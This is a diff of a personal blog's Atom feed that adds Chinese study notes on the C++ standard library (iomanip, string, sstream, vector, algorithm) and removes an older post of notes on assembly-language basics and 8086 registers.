+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::resetiosflags&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;重置指定的流状态&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::resetiosflags(std::ios::showbase) &amp;lt;&amp;lt; std::hex &amp;lt;&amp;lt; 42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;2a&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::setiosflags&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;设置指定的流状态&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;std::cout &amp;lt;&amp;lt; std::setiosflags(std::ios::showbase) &amp;lt;&amp;lt; std::hex &amp;lt;&amp;lt; 42;&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;0x2a&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;p&gt;其中比较重要的：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;cout&amp;lt;&amp;lt; setfill(&#39;*&#39;)&amp;lt;&amp;lt;std::left&amp;lt;&amp;lt; setw(10) &amp;lt;&amp;lt; number;
+//默认空格填充，以及右对齐
+cout&amp;lt;&amp;lt;std::fixed&amp;lt;&amp;lt;setprecision(3) &amp;lt;&amp;lt; pi;
+//默认是科学计数（std::scientific）,这里固定小数点并设置浮点有效位数
+cout &amp;lt;&amp;lt; std::setiosflags(std::ios::uppercase) &amp;lt;&amp;lt; std::hex &amp;lt;&amp;lt; 255;
+//设置格式标志，在输出十六进制数、科学计数法表示的数等时，其中的字母会以大写形式输出（默认小写）。后续使用std::resetiosflags(std::ios::uppercase)清除。后一个就是输出数字以十六进制
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;string&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#string&#34;&gt;#&lt;/a&gt; &amp;lt;string&amp;gt;&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;size()&lt;/code&gt; ：返回字符串的长度。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;empty()&lt;/code&gt; ：检查字符串是否为空。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;operator[]&lt;/code&gt; ：通过索引访问字符串中的字符。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;substr(开始位置索引，长度)&lt;/code&gt; ：返回子字符串。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;find(要查找的字符)&lt;/code&gt; ：查找子字符串在主字符串中的位置，返回索引，没找到是 - 1。&lt;/p&gt;
+&lt;p&gt;改为 &lt;code&gt;rfind&lt;/code&gt;  就反向寻找。&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;&lt;code&gt;replace(索引,替换字符数，替换字符)&lt;/code&gt; ：替换字符串中的某些字符。&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;insert,erase 也都使用，语法和下面那个 vector 一样&lt;/p&gt;
+&lt;p&gt;[其他见]( &lt;a href=&#34;https://www.runoob.com/cplusplus/cpp-libs-string.html&#34;&gt;C++ 标准库  | 菜鸟教程&lt;/a&gt; )&lt;/p&gt;
+&lt;h3 id=&#34;sstream&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#sstream&#34;&gt;#&lt;/a&gt; &amp;lt;sstream&amp;gt;&lt;/h3&gt;
+&lt;p&gt;处理字符串和数字之间的转换  （可以像处理流一样处理字符串）&lt;/p&gt;
+&lt;p&gt;主要类&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;istringstream&lt;/code&gt; ：用于从字符串中读取数据。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;ostringstream&lt;/code&gt; ：用于将数据写入字符串。&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;stringstream&lt;/code&gt; ：是 &lt;code&gt;istringstream&lt;/code&gt;  和 &lt;code&gt;ostringstream&lt;/code&gt;  的组合，可以同时进行读取和写入操作。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;//定义
+std::istringstream iss(&amp;quot;some data&amp;quot;);
+std::ostringstream oss;
+std::stringstream ss;
+//读取数字，读取的类型跟定义的有关，不够则保留原有值
+int i;
+double d;
+iss &amp;gt;&amp;gt; i &amp;gt;&amp;gt; d;
+//写入数据，都变成字符串
+oss &amp;lt;&amp;lt; i &amp;lt;&amp;lt; &amp;quot; &amp;quot; &amp;lt;&amp;lt; d;
+//覆写，返回已有内容（如有参数去覆写，则返回覆写后的）,这里是清空
+string a;
+a=oss.str(&amp;quot;&amp;quot;);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;vector&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#vector&#34;&gt;#&lt;/a&gt; &amp;lt;vector&amp;gt;&lt;/h3&gt;
+&lt;p&gt;用于存储动态大小的数组&lt;/p&gt;
+&lt;p&gt;序列容器，允许用户在容器的末尾快速地添加或删除元素&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;// 空的vector
+std::vector&amp;lt;int&amp;gt; vec1;   
+// 长度为5的vector，元素默认初始化
+std::vector&amp;lt;int&amp;gt; vec2(5);
+// 长度为5的vector，元素值为10
+std::vector&amp;lt;int&amp;gt; vec3(5, 10);  
+// 使用初始化列表初始化
+std::vector&amp;lt;int&amp;gt; vec4 = &amp;#123;1, 2, 3, 4&amp;#125;;   
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;//添加，访问，数量，清空，检查是否为空（返回bool）
+myVector.push_back(10);或者myVector.emplace_back()
+    //前者是先创建临时匀速，然后复制或移动过去，后者直接尾部构造
+int firstElement = myVector[0];
+size_t size = myVector.size();  //循环中会用到i&amp;lt;myVector.size()
+myVector.clear();
+numbers.empty();
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;其他：&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;函数&lt;/th&gt;
+&lt;th style=&#34;text-align:left&#34;&gt;说明&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;push_back(const T&amp;amp; val)&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;在末尾添加元素&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;pop_back()&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;删除末尾元素&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;at(size_t pos)&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;返回指定位置的元素，带边界检查，会抛异常&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;operator[]&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;返回指定位置的元素，不带边界检查&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;front()&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;返回第一个元素&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;back()&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;strong&gt;返回最后一个元素&lt;/strong&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;data()&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;返回指向底层数组的指针&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;size()&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;返回当前元素数量&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;capacity()&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;返回当前分配的容量&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;reserve(size_t n)&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;预留至少  &lt;code&gt;n&lt;/code&gt;  个元素的存储空间，防止频繁分配&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;resize(size_t n)&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;将元素数量调整为  &lt;code&gt;n&lt;/code&gt;&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;clear()&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;清空所有元素&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;insert(iterator pos, val)&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;在指定位置插入元素&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;erase(iterator pos)&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;删除指定位置的元素&lt;/td&gt;
+&lt;/tr&gt;
+&lt;tr&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;&lt;code&gt;begin()&lt;/code&gt;  /  &lt;code&gt;end()&lt;/code&gt;&lt;/td&gt;
+&lt;td style=&#34;text-align:left&#34;&gt;返回起始 / 结束&lt;strong&gt;迭代器&lt;/strong&gt;（0/n）&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;insert(iterator pos, const T&amp;amp; val);
+erase(iterator pos);
+//pos：一个迭代器，指向容器中要插入/删除元素的位置。
+！！！注意是插入到指定位置之前（也就是插入的元素自身占据了那个位置）。
+//val：要插入的元素的值。
+返回值：返回指向新插入元素的迭代器/指向被删除元素之后元素的迭代器，删最后一个就返回end()。
+pos通常是`a.begin/end()+数字`的形式，数字就是索引，当然也可以用上述返回的迭代器操作
+//操作后的其他元素会依次移动
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;就算你用不到那么多功能，也可以当作普通的数组使用&lt;/p&gt;
+&lt;p&gt;for (int a:vector), 这种语法仍然正确。&lt;/p&gt;
+&lt;p&gt;同时，它有指针和引用，并且作为参数传递，等同于数组，&lt;strong&gt;不会退化&lt;/strong&gt;（如果不是下面第二种的话），&lt;strong&gt;可以当作返回值&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;figcaption data-lang=&#34;C++&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;modifyVector&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;vector&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;*&lt;/span&gt; vec&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;也可以&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;modifyVector&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&amp;amp;&lt;/span&gt;vec&lt;span class=&#34;token punctuation&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;]&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; vec&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;size&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;注意一下：容器名不是指针&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;std&lt;span class=&#34;token double-colon punctuation&#34;&gt;::&lt;/span&gt;vector&lt;span class=&#34;token operator&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;token keyword&#34;&gt;int&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;&gt;&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;createVector&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token keyword&#34;&gt;return&lt;/span&gt; vec&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h3 id=&#34;algorithm&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#algorithm&#34;&gt;#&lt;/a&gt; &amp;lt;algorithm&amp;gt;&lt;/h3&gt;
+&lt;p&gt;提供了一组用于操作容器（如普通数组（包括其指针）、向量、列表等）的算法 (楼上那个也行)&lt;/p&gt;
+&lt;p&gt;基本语法（大多数）：&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;algorithm_name(container.begin(), container.end(), ...);
+//下面迭代器就不解释了
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;1排序&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1排序&#34;&gt;#&lt;/a&gt; 1. 排序&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;//最后一个参数是排序函数，不指定时，基本类型按升序
+sort(container.begin(), container.end(), compare_function);
+//部分排序，前三个升序（在到end()的范围中，不包含），剩下未定义
+partial_sort(vec.begin(), vec.begin() + 3, vec.end());
+//稳定排序，当相等时保持原顺序，用于多次排序且要保留上次排序的相对顺序时
+stable_sort(vec.begin(), vec.end(), compare_function);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;2搜索&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2搜索&#34;&gt;#&lt;/a&gt; 2. 搜索&lt;/h4&gt;
+&lt;pre&gt;&lt;code&gt;//指向匹配的元素，没有就是end()
+auto it = find(container.begin(), container.end(), value);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;3复制&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3复制&#34;&gt;#&lt;/a&gt; 3. 复制&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;vector&amp;lt;int&amp;gt; source = &amp;#123;1, 2, 3, 4, 5&amp;#125;;
+int destination[5];
+copy(source.begin(), source.end(), destination);
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;4比较&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#4比较&#34;&gt;#&lt;/a&gt; 4. 比较&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;bool result = equal(first1, last1, first2, compare_function);
+//不包含last，最后那个参数可选，自定义比较规则（函数或 Lambda 表达式），返回bool
+//注意对于基本类型参数是指针，其他是迭代器
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;5修改&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#5修改&#34;&gt;#&lt;/a&gt; 5. 修改&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;//翻转
+std::reverse(vec.begin(), vec.end());
+//区间赋值
+std::fill(vec.begin(), vec.end(), 0);
+//区间替换指定值
+std::replace(vec.begin(), vec.end(), 1, 99); 
+//区域赋值
+std::copy(vec.begin(), vec.end(), vec2.begin());
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;ps自定义比较函数&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ps自定义比较函数&#34;&gt;#&lt;/a&gt; PS 自定义比较函数&lt;/h4&gt;
+&lt;pre&gt;&lt;code class=&#34;language-c++&#34;&gt;bool compare(int a, int b) &amp;#123;
+    return a &amp;gt; b;
+&amp;#125;
+true表示a在b前面，也就是不用换位置，反之亦然。
+对齐输入就是ture按原位置，false反之
+    这里是降序排列
+&lt;/code&gt;&lt;/pre&gt;
 </content>
         <category term="技术" scheme="https://zhewanyiershinicheng.github.io/tags/%E6%8A%80%E6%9C%AF/" />
         <updated>2025-03-22T10:36:29.000Z</updated>
@@ -3846,210 +4241,6 @@ mysqli_close($conn);
 &lt;p&gt;这是一个关于在 xxxxx 中逐步发现关于土豆真相的故事。&lt;/p&gt;
 </content>
         <category term="离谱" scheme="https://zhewanyiershinicheng.github.io/categories/%E7%A6%BB%E8%B0%B1/" />
-        <updated>2024-10-11T09:48:50.000Z</updated>
-    </entry>
-    <entry>
-        <id>https://zhewanyiershinicheng.github.io/2024/10/11/%E6%B1%87%E7%BC%96/</id>
-        <title>汇编</title>
-        <link rel="alternate" href="https://zhewanyiershinicheng.github.io/2024/10/11/%E6%B1%87%E7%BC%96/"/>
-        <content type="html">&lt;p&gt;汇编语言的组成：&lt;/p&gt;
-&lt;p&gt;1.&lt;a href=&#34;%E6%AF%8F%E7%A7%8DCPU%E9%83%BD%E6%9C%89%E8%87%AA%E5%B7%B1%E7%9A%84%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E9%9B%86%EF%BC%8C%E6%88%91%E4%BB%AC%E7%9C%8B%E5%88%B0%E7%9A%84SSE%E7%AD%89%E5%B0%B1%E6%98%AF%EF%BC%8C%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AF%E4%B8%80%E4%BA%9B%E5%B8%B8%E8%A7%81%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4%E7%9A%84%E9%9B%86%E5%90%88%EF%BC%8C%E7%94%A8%E4%BA%8E%E8%BE%83%E4%B8%BA%E5%BF%AB%E9%80%9F%E7%9A%84%E5%AE%8C%E6%88%90%E7%89%B9%E5%AE%9A%E4%BB%BB%E5%8A%A1&#34;&gt; 汇编指令&lt;/a&gt;（机器码的助记符）// 直接等价于特定的&lt;a href=&#34;%E5%B0%B1%E6%98%AF%E4%B8%80%E6%AE%B5%E6%9C%89%E7%89%B9%E5%AE%9A%E5%8A%9F%E8%83%BD%E7%9A%84%E6%9C%BA%E5%99%A8%E7%A0%81&#34;&gt;机器指令&lt;/a&gt;，所以&lt;a href=&#34;%E5%9B%A0%E4%B8%BA%E7%89%B9%E5%AE%9A%E7%9A%84%E6%9C%BA%E5%99%A8%E7%A0%81%E5%B0%B1%E7%9B%B4%E6%8E%A5%E6%98%AF%E6%B1%87%E7%BC%96%E6%8C%87%E4%BB%A4&#34;&gt;反编译一般是汇编&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;2. 伪指令（编译器执行）// 没有对应的机器码，和其他符号一样，都是编译器实现的&lt;/p&gt;
-&lt;p&gt;3. 其他符号（编译器识别）// 转化成逻辑运算&lt;/p&gt;
-&lt;p&gt;存储器：&lt;/p&gt;
-&lt;p&gt;指令和数据都是在存储器中存放，也就是内存（磁盘内的数据得先到内存中才能被使用）&lt;/p&gt;
-&lt;p&gt;虚拟内存，就是用部分硬盘当作内存用（18 年也不至于是 sata2 吧）&lt;/p&gt;
-&lt;p&gt;存储单元：&lt;/p&gt;
-&lt;p&gt;// 包括缓存&lt;/p&gt;
-&lt;p&gt;被划分为若干个存储单元，每个单元&lt;strong&gt;从 0 开始编号&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;制图时从上到下，由低地址到高地址，但是读起来还是从高开始（忽略第一个 1 之前的 0）&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;单位就不必说了，最后那个 B 代表 Byte&lt;/p&gt;
-&lt;p&gt;CPU 对存储器的读写：&lt;/p&gt;
-&lt;p&gt;三类信息交互&lt;/p&gt;
-&lt;p&gt;1.&lt;a href=&#34;%E5%AD%98%E5%82%A8%E5%8D%95%E5%85%83%E7%9A%84%E5%9C%B0%E5%9D%80&#34;&gt; 地址信息&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;2.&lt;a href=&#34;%E5%99%A8%E4%BB%B6%E9%80%89%E6%8B%A9%EF%BC%8C%E8%AF%BB%E5%86%99%E5%91%BD%E4%BB%A4&#34;&gt; 控制信息&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;3.&lt;a href=&#34;%E8%AF%BB%E6%88%96%E5%86%99&#34;&gt; 数据信息&lt;/a&gt;&lt;/p&gt;
-&lt;p&gt;CPU 与内存之间的&lt;a href=&#34;%E5%85%B6%E5%AE%9E%E6%89%80%E6%9C%89%E6%80%BB%E7%BA%BF%E9%83%BD%E6%98%AF&#34;&gt;总线&lt;/a&gt;，实际上就是包含了这三者，即地址总线，数据总线，控制总线（逻辑划分）。&lt;/p&gt;
-&lt;p&gt;它们都是线性排列的&lt;/p&gt;
-&lt;p&gt;指令与数据：&lt;/p&gt;
-&lt;p&gt;&lt;a href=&#34;%E5%9C%A8%E5%AD%98%E5%82%A8%E5%99%A8%E4%B8%AD%E6%B2%A1%E6%9C%89%E4%BB%BB%E4%BD%95%E5%8C%BA%E5%88%AB&#34;&gt;同样的二进制信息，可以是数据，也可以是信息&lt;/a&gt;。具体当作什么，取决于它是在哪种总线上&lt;/p&gt;
-&lt;p&gt;1. 地址总线&lt;/p&gt;
-&lt;p&gt;指定存储单元，总线能传输多少，就能对多少个存储单元进行寻址。&lt;/p&gt;
-&lt;p&gt;（64 位，32 位说的就是地址总线的宽度）//64bit，即 8byte&lt;/p&gt;
-&lt;p&gt;要实现 64 位，CPU，OS，软件都必需是 64 位的，这是因为向下继承&lt;/p&gt;
-&lt;p&gt;内存会自动定位从地址总线来的地址&lt;/p&gt;
-&lt;p&gt;有 N 根地址总线位宽就是 N（其实就是 Nbit），一位最多可以指定 2^n 个内存单元&lt;/p&gt;
-&lt;p&gt;2. 数据总线&lt;/p&gt;
-&lt;p&gt;宽度越大，传输速度越快&lt;/p&gt;
-&lt;p&gt;注意，索引从低到高，传输数据是从低位开始，也就是数据的后面一段（多次传输时）&lt;/p&gt;
-&lt;p&gt;3. 控制总线&lt;/p&gt;
-&lt;p&gt;操作只有读和写（1/0），控制总线是个总称，数量越多，意味着 CPU 可以控制的外部元器件的种类越多，有多少根，就有多少种&lt;/p&gt;
-&lt;p&gt;内存读写是几根控制线综合发出的（有俩，读 / 写信号输出控制线）&lt;/p&gt;
-&lt;p&gt;内存地址空间：&lt;/p&gt;
-&lt;p&gt;大小就是 CPU 的地址线宽度可寻得的内存单元个数&lt;/p&gt;
-&lt;p&gt;主板，接口卡，声卡（其实不是没了），RAM，ROM (就是 BIOS 的那个，&lt;a href=&#34;%E4%B8%8D%E5%8F%AA%E4%B8%BB%E6%9D%BF%E6%9C%89%EF%BC%8C%E6%98%BE%E5%8D%A1%EF%BC%8C%E5%A3%B0%E5%8D%A1&#34;&gt;可以刷&lt;/a&gt;)&lt;/p&gt;
-&lt;p&gt;CPU 看到的其他元器件：&lt;/p&gt;
-&lt;p&gt;&lt;img loading=&#34;lazy&#34; data-src=&#34;1728139697850.png&#34; alt=&#34;1728139697850&#34; /&gt;&lt;/p&gt;
-&lt;p&gt;其实就是看成&lt;a href=&#34;%E5%85%B6%E5%AE%9E%E5%B0%B1%E6%98%AF%E8%AF%B4%E5%AE%9E%E9%99%85%E4%B8%8A%E4%B8%8D%E6%98%AF%E8%BF%99%E6%A0%B7%E7%9A%84%EF%BC%8C%E5%8F%AA%E6%98%AF%E5%9C%A8cpu%E5%AE%9E%E9%99%85%E8%BF%90%E8%A1%8C%E4%B8%AD%E5%8F%AF%E4%BB%A5%E7%AD%89%E4%BB%B7%E4%BA%8E%E4%B8%80%E4%B8%AA%E5%AD%98%E5%82%A8%E5%99%A8&#34;&gt;逻辑存储器&lt;/a&gt;，所有内存单元构成的存储空间是一维线性空间，每个内存单元都有唯一的地址，即&lt;strong&gt;物理地址&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;内存空间地址段分配：&lt;/p&gt;
-&lt;p&gt;// 实际上是在分配 CPU 的总线 //&lt;/p&gt;
-&lt;p&gt;不同设备有自己分配到的地址段，各部分具体大小看 CPU。其实就是将所有的存储器统一起来。&lt;/p&gt;
-&lt;p&gt;寄存器（CPU 工作原理）&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;CPU 概述&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;由运算器，控制器，寄存器组成，也是要以总线相连&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;通用寄存器&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;一共有 14 个：（16 位）&lt;/p&gt;
-&lt;p&gt;AX,BX,CX,DX,SI,DI,SP,BP,IP,CS,SS,DS,ES,PSW&lt;/p&gt;
-&lt;p&gt;它们甚至在缓存之前。&lt;a href=&#34;%E4%BD%86%E6%98%AF%E9%80%9A%E7%94%A8%E7%9A%84%E5%8F%AA%E6%9C%89%E8%BF%9914%E4%B8%AA&#34;&gt;寄存器实际上不只 14 个&lt;/a&gt;，指令集也会有自己的寄存器。&lt;/p&gt;
-&lt;p&gt;寄存器都是 16 位的 2 字节，也就是&lt;strong&gt; 1 字&lt;/strong&gt;&lt;/p&gt;
-&lt;p&gt;更古早的 U 寄存器只有 8 位，为了兼容，现在的寄存器可以分成俩八位来用&lt;/p&gt;
-&lt;p&gt;比如 AX 可以分为&lt;a href=&#34;%E8%BF%99%E9%87%8C%E9%AB%98%E4%BD%8D%E5%85%B6%E5%AE%9E%E9%83%BD%E6%98%AF%E5%A1%AB0%EF%BC%8C%E8%BF%99%E6%98%AF%E4%B8%BA%E4%BA%86%E9%98%B2%E6%AD%A2%E5%9C%A864%E4%BD%8D%E4%B8%8B%E5%AE%9E%E9%99%85%E8%A1%A8%E7%A4%BA%E7%9A%84%E6%95%B0%E4%B8%8E%E6%9C%AC%E6%9D%A5%E7%9A%84%E4%B8%8D%E4%B8%80%E6%A0%B7%EF%BC%88%E5%9B%A0%E4%B8%BA%E4%BC%9A%E8%A2%AB%E5%90%88%E8%B5%B7%E6%9D%A5%E7%9C%8B%EF%BC%89&#34;&gt; AH&lt;/a&gt; 和&lt;a href=&#34;%E5%AE%9E%E9%99%85%E4%B8%8A%E4%BD%BF%E7%94%A8%E7%9A%84%E9%83%A8%E5%88%86&#34;&gt; AL&lt;/a&gt;。BH,CH,DH 同理&lt;/p&gt;
